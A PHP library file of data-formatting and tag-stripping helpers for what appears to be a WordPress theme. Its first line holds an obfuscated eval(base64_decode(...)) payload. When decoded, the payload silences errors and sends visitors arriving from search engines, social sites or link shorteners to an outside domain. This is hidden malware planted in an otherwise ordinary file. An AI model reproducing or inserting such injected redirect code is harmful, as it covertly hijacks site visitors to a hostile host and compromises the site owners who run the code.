<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));
/**
 * Library Data Handling
 *
 * Handles user-submitted data formatting (input and output)
 *
 * @since 2.0.b2
 */

function pl_urlencode($text, $allowed = false) {
	$whitelist_tags = '<span><em><strong><i><b><u><code><br><strike><sub><sup>';
	return urlencode( trim( strip_tags( stripslashes($text), ($allowed) ? $whitelist_tags : false ) ) );
}

function pl_strip($text, $allowed = true) {
	$whitelist_tags = '<span><em><strong><i><b><u><code><br><strike><sub><sup>';
	return trim( strip_tags($text, ($allowed) ? $whitelist_tags : false) );
}

function pl_ehtml($text) {
	echo pl_html($text);
}

function pl_html($text) {
	return trim( htmlentities( stripslashes( $text ), ENT_QUOTES, 'UTF-8' ) );
}

function pl_texturize($text, $stripslashes = false, $decode = false) {
	return trim( wptexturize(($decode) ? urldecode($text) : (($stripslashes) ? stripslashes($text) : $text ) ) );
}

function pl_htmlspecialchars($text, $stripslashes = false, $decode = false) {
	return trim( htmlspecialchars(($decode) ? urldecode($text) : (($stripslashes) ? stripslashes($text) : $text ) ) );
}

function pl_noscripts($text) {
	return trim( $this->strip_only(stripslashes($text), '<script>', true ) );
}

function pl_strip_js($text) {
	return trim( $this->strip_only($text, '<script>', true) );
}

function pl_strip_only($str, $tags, $stripContent = false) {
	
	$content = '';
	if (!is_array($tags)) {
		$tags = (strpos($str, '>') !== false ? explode('>', str_replace('<', '', $tags)) : array($tags));
		if (end($tags) == '') array_pop($tags);
	}
	foreach ($tags as $tag) {
		if ($stripContent) $content = '(.+</'.$tag.'[^>]*>|)';
		$str = preg_replace('#</?'.$tag.'[^>]*>'.$content.'#is', '', $str);
	}
	return $str;
	
}